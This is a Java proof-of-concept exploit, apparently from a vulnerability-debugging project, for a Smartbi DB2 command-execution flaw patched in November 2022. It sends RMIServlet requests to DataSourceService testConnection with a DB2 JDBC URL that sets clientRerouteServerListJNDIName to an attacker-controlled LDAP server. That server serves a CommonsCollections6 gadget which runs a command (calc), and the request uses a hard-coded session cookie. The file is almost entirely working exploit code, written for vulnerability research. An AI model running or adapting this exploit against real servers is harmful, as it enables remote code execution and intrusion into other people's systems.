package cve;

import java.io.IOException;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;
import smartbi.framework.rmi.RMIServlet;
import smartbi.freequery.client.datasource.DataSourceService;
import smartbi.freequery.filter.CheckIsLoggedFilter;


/**
 * 漏洞：
 * https://www.smartbi.com.cn/patchinfo
 * 2022-11-22  修复了 DB2 命令执行漏洞。
 *
 * 关键调试类和方法：
 * smartbi.framework.rmi.RMIServlet#doPost
 * smartbi.freequery.client.datasource.DataSourceService#testConnection
 * smartbi.freequery.client.datasource.DataSourceService#testConnectionList
 *
 */
public class PATCH_20221122 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/vision/RMIServlet";
        // TODO 修改JNDI地址
        String jndiUrl = "ldap://10.58.120.201:1389/yqrrAVckti/CommonsCollections6/Exec/eyJjbWQiOiJjYWxjIn0=";
        String body1 = "className=DataSourceService&methodName=testConnection&params=[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]";
        String body2 = "className=DataSourceService&methodName=testConnectionList&params=[[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]]";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        // TODO 修改登陆后的Cookie
        httpPost.addHeader("Cookie","JSESSIONID=B8798EDA474B65FDB0FBD9A6F8101BC1");
        Response response = httpRequest.sendStringPost(httpPost, body1);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
